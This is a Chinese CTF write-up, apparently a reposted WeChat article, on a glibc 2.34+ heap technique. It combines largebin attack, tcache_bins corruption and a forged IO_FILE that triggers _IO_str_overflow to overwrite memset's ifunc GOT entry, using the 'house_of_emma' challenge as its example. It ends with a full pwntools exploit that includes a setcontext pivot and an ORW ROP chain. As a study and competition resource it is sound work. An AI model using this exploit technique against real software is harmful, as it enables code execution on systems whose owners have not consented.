> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/vdfDBN6uXd0VvI_WwQ-kgw)

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSvSvz5aCqSYoVHDE0jLBIv2ibDXFZicKL0n6mdJA9RmqaAmMuXSOvwP8rg5kwzNcPFbJXoEgPcUNtg/640?wx_fmt=png)

 前言

总所周知，我们在做堆题的时候经常是对堆的漏洞进行利用，最终的效果是改 malloc hook 或者 free hook 的地址为 onegadget 或者 system 的地址来拿到 shell。这是因为在执行 malloc 和 free 的时候，会对这两个地址进行判断，如果不为零，就跳到这个地址去执行。但是，到了 glibc2.34 的版本之后，就没有了这个判断，不能再利用其来 getshell。

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSvSvz5aCqSYoVHDE0jLBIv2ibDXFZicKL0n6mdJA9RmqaAmMuXSOvwP8rg5kwzNcPFbJXoEgPcUNtg/640?wx_fmt=png)

利用条件

能进行 largebin attack

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSvSvz5aCqSYoVHDE0jLBIv2ibDXFZicKL0n6mdJA9RmqaAmMuXSOvwP8rg5kwzNcPFbJXoEgPcUNtg/640?wx_fmt=png)

 适用范围  

程序中仅有 calloc 函数且申请出来的大小不能放进 tcache 的情况。

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSvSvz5aCqSYoVHDE0jLBIv2ibDXFZicKL0n6mdJA9RmqaAmMuXSOvwP8rg5kwzNcPFbJXoEgPcUNtg/640?wx_fmt=png)

攻击原理

在新版本下，我们主要思想的就是要找一个能代替 malloc hook 和 free hook 的东西，我们可以发现在 libc 中存在很多类似 j_xxxxx_ifunc 的函数，它会先跳到一个类似 got 表的地方存放的地址去执行。

![](https://mmbiz.qpic.cn/mmbiz_jpg/Gw8FuwXLJnSvSvz5aCqSYoVHDE0jLBIve1QqcSVPJMpZBkQIMUpA352Qvj5RiacFPcfHVLCxqMMDcma5kFRU6FQ/640?wx_fmt=jpeg)

还有一个就是要解决程序中只有 calloc 而无法利用 tcache 进行任意地址分配的问题，于是就想到了 IO_str_overflow 函数，可以看到里面有 malloc、memcpy、free 函数，后面还有个我们上面说到的 j_memeset_ifunc 函数，我们可以通过前面三个任意分配和任意写把 memset_ifunc 改成任意地址，达到任意代码执行的操作。

![](https://mmbiz.qpic.cn/mmbiz_jpg/Gw8FuwXLJnSvSvz5aCqSYoVHDE0jLBIvQ7EFIB2cfiaPjto52bSAhhjH71GeKmtmpGQclicGfqsu2iaXvA66FlzeQ/640?wx_fmt=jpeg)

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/Gw8FuwXLJnSvSvz5aCqSYoVHDE0jLBIvutQ34WphmOrEFTZRETjjWJxia0ibLjWCYX3B8NUWm2xkGYoKvcuhBINA/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSvSvz5aCqSYoVHDE0jLBIv2ibDXFZicKL0n6mdJA9RmqaAmMuXSOvwP8rg5kwzNcPFbJXoEgPcUNtg/640?wx_fmt=png)

具体例题

这里我们就以湖湘杯的 house_of_emma 为例，给到的是 2.34 版本的 libc。

**分析**

这题漏洞很明显，就是存在 uaf。

**![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSvSvz5aCqSYoVHDE0jLBIvb47poTmBUibc1V60oiauhpODXkf6heWaIN3YMfNJSC5jE5dxCfqgt2Bg/640?wx_fmt=png)**

申请的堆只能大于 0x40f，也就是说不能放进 tcache bin 了。

![](https://mmbiz.qpic.cn/mmbiz_jpg/Gw8FuwXLJnSvSvz5aCqSYoVHDE0jLBIvib46NtHUK79gNvfBD3XhvEibSChaMUwafvuYWxlicXibgPWbkndJSYE7iaw/640?wx_fmt=jpeg)

### **利用思路**

1. 利用 UAF 泄露 libc 地址和堆地址。

2. 利用 largebin atack 修改 mp_.tcache_bins 的值为堆地址，之后 free 掉的 chunks 都会被放进 tcache，而且在申请的时候会从堆里面取地址申请，当我们申请一个大的 chunks 时，它就会从我们申请的 chunks 去取地址进行分配，如果在我们申请的 chunks 改成任意地址，就能造成任意地址分配。

![](https://mmbiz.qpic.cn/mmbiz_jpg/Gw8FuwXLJnSvSvz5aCqSYoVHDE0jLBIvUnsJDtbLVL4bibA2ZC2MbyRRENs7u9whA6jMyv1SlTNORwOOHUaQ0ibw/640?wx_fmt=jpeg)

3、但是 tcache bin 里面的 chunk 是要 malloc 才能申请出来的，所以我们要改 io file 结构体去执行 IO_str_overflow 函数。这里我们选择的是 stdout 指针，然后在堆里面布置好 iofile 结构体。

![](https://mmbiz.qpic.cn/mmbiz_jpg/Gw8FuwXLJnSvSvz5aCqSYoVHDE0jLBIvzzqANd0DQpUjXYGmJlliciaTomUEKsyfdfqXvYkY5qC1tsANibiccAKZfA/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/Gw8FuwXLJnSvSvz5aCqSYoVHDE0jLBIvCId9zdVtcov1XSPDuyJJ1ckjcwy0UYA1PLHibb3ZKQdTKB4WdSyy1NA/640?wx_fmt=jpeg)

4、当执行 puts 函数的时候，就会去执行_GI__IO_str_overflow 的 malloc 函数，他的参数等于（ _IO_buf_end- _IO_buf_base）*2+100

![](https://mmbiz.qpic.cn/mmbiz_jpg/Gw8FuwXLJnSvSvz5aCqSYoVHDE0jLBIv8Ly2exUuloF5UicgibPvicFgJVrsamkrPhaeAS6HkY4C8EuWYbULcMz5Q/640?wx_fmt=jpeg)

5、而我们上面已经将 mp_.tcache_bins 改成很大的值，所以当申请 0x490 的 chunks 的时候，tcache 就会从 0x55555555b2d0 取值去分配，由于我们已经将其地址改成 memset_ifunc，就会分配到那里然后调用 memcpy 进行任意改。  

![](https://mmbiz.qpic.cn/mmbiz_jpg/Gw8FuwXLJnSvSvz5aCqSYoVHDE0jLBIvLd8PanSe9ZMibjaBjDTDwgTXTRPuOhW1VmficDSozKMhBF1J8wT3JcAA/640?wx_fmt=jpeg)

6、因为这题开了沙盒，禁用了 system，所以我们要通过 orw 的方法绕过沙盒去读取 flag，这里就要找一个合适的 gadget，我们一般是找 libc 上面的 setcontext 函数，但是前提条件是能控制 rdx，所以我们还要找个 gadget 来控制 rdx，这里的 rbx 和 r14 是堆的地址比较容易控制，于是就在 libc 找到以下 gadget 填入 memset_ifunc，执行完 gadget 之后配合 setcontext 就能 orw 顺利拿到 flag。  

```
0x000000000006f476 : mov rdx, rbx ; mov rsi, r13 ; mov rdi, rbp ; call qword ptr [r14 + 0x38]
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/Gw8FuwXLJnSvSvz5aCqSYoVHDE0jLBIvfpGicYeGU4zat5ibCkYZSMFeLQCuhuy1CTEPqChl5mjGSXjicgxZHVKpg/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSvSvz5aCqSYoVHDE0jLBIv2ibDXFZicKL0n6mdJA9RmqaAmMuXSOvwP8rg5kwzNcPFbJXoEgPcUNtg/640?wx_fmt=png)

完整 exp

```
from pwn import*
context.log_level=True
libc=ELF('libc.so.6')
#p = process(["./ld.so", "./pwn"],env={"LD_PRELOAD":"./libc.so.6"})
p = process('./pwn')
#p=remote('172.35.19.11',9999)


def add(idx,size):
p.recvuntil('Pls input the opcode\n')
payload='\x01'+p8(idx)+p16(size)+'\x05'
p.send(payload)
def delete(idx):
p.recvuntil('Pls input the opcode\n')
payload='\x02'+p8(idx)+'\x05'
p.send(payload)
def show(idx):
p.recvuntil('Pls input the opcode\n')
payload='\x03'+p8(idx)+'\x05'
p.send(payload)
def edit(idx,data):
p.recvuntil('Pls input the opcode\n')
payload='\x04'+p8(idx)+p16(len(data))+str(data)+'\x05'
p.send(payload)


add(0,0x440)
add(1,0x4a0)
add(2,0x410)
add(3,0x490)
add(4,0x430)
add(5,0x490)
add(6,0x430)
add(9,0x4c0)
add(10,0x490)
add(11,0x490)
add(12,0x490)
add(13,0x490)
add(14,0x490)
add(15,0x490)
add(16,0x490)
delete(1)
show(1)

leak=u64(p.recv(6).ljust(8,'\x00'))
print hex(leak)
libcbase=leak-0x1f30d0
arena=leak+0x3f0
addr=libcbase+(0x7ffff7fb0390-0x00007ffff7dbe000) #0x7ffff7fb1660

IO_str_vtable=libcbase+(0x7ffff7fb2620-0x00007ffff7dbe000)
memset_got=libcbase+(0x7ffff7fb0180-0x00007ffff7dbe000)

'''
0x0000000000082513 : mov rdx, rbx ; mov rsi, r12 ; mov rdi, rbp ; call qword ptr [r13 + 0x38]
0x000000000007494a : mov rdx, rbx ; mov rsi, r12 ; mov rdi, rbp ; call qword ptr [r14 + 0x38]
0x000000000006f476 : mov rdx, rbx ; mov rsi, r13 ; mov rdi, rbp ; call qword ptr [r14 + 0x38]
0x000000000002daa2 : pop rdi ; ret
0x0000000000037c0a : pop rsi ; ret
0x00000000001066e1 : pop rdx ; pop r12 ; ret
'''
setcontext=libcbase+0x50BFD
gadget=libcbase+0x000000000006f476

edit(9,p64(gadget)*6+p64(setcontext)*2)

p.recvuntil('Pls input the opcode')
payload='\x01\x07\x00\x05'+'\x02\x03'+'\x04\x01\x20\x00'+p64(arena)*2+p64(0)+p64(addr-0x20)+'\x01\x08\x10\x04\x05'


p.send(payload)


for i in range(7):
delete(i+10)

#delete(9)

show(11)
leak=u64(p.recvuntil('\x0a',drop=True).ljust(8,'\x00'))<<12
print hex(leak)

heapbase=leak-0x4000
lock=libcbase+0x1f5730
addr=libcbase+(0x7ffff7fb1848-0x00007ffff7dbe000)
system=libcbase+libc.sym['system']
puts=libcbase+0x000000000007A050

v4=heapbase+0x4190
rsp=heapbase+0x460
flag=heapbase+0x760


pop_rdi=libcbase+0x000000000002daa2
pop_rsi=libcbase+0x0000000000037c0a
pop_rdx_r12=libcbase+0x00000000001066e1
fake_IO_FILE = p64(memset_got)
fake_IO_FILE += p64(v4)               #v4
fake_IO_FILE += p64(v4+0x216)
fake_IO_FILE += p64(memset_got)*3
fake_IO_FILE = fake_IO_FILE.ljust(0x58, '\x00')              
fake_IO_FILE += p64(lock) #lock
fake_IO_FILE += p64(0)  
fake_IO_FILE += p64(0)  
fake_IO_FILE += p64(rsp) #lock
fake_IO_FILE += p64(pop_rdi)  
fake_IO_FILE = fake_IO_FILE.ljust(0xa8, '\x00')
fake_IO_FILE += p64(IO_str_vtable)       #change vtable



open=libcbase+libc.sym['open']
read=libcbase+libc.sym['read']
write=libcbase+libc.sym['write']


payload='\x02\x05\x03\x05\x03\x05\x03\x05\x03\x05\x03\x05'+'\x04\x01\xd0\x00'+p64(arena)*2+p64(0)+p64(addr-0x20)+fake_IO_FILE+'\x01\x08\x10\x04'
payload=payload.ljust(0x1c0,'\x00')+p64(flag)+p64(open)
payload+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(flag)+p64(pop_rdx_r12)+p64(0x30)+p64(0)+p64(read)
payload+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(flag)+p64(pop_rdx_r12)+p64(0x30)+p64(0)+p64(write)
payload=payload.ljust(0x4c0,'\x00')+'./flag'
#attach(p,'b *'+str(0x0000555555554000+0x1503)+'\nb *'+str(0x00007ffff7fc2000+0x1886)+'\nb *0x7ffff7e449b9')
#pause()

print hex(libcbase)
print hex(heapbase)

p.send(payload)

p.interactive()
```

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnT8b5DuBiaiaYvL2LMUtjK1bAbSutY6d3VCuLyeaJqg4kjYCAicFDOCCibEibsoTDia8hgcysibc762mf1FQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTqMVczDE3GyGU1hPA7RQQlIESOibcZaWMeJVMicz1JUKnoSKhomypNO0J7q4BAxqjgxmpWYYe17ia2A/640?wx_fmt=png)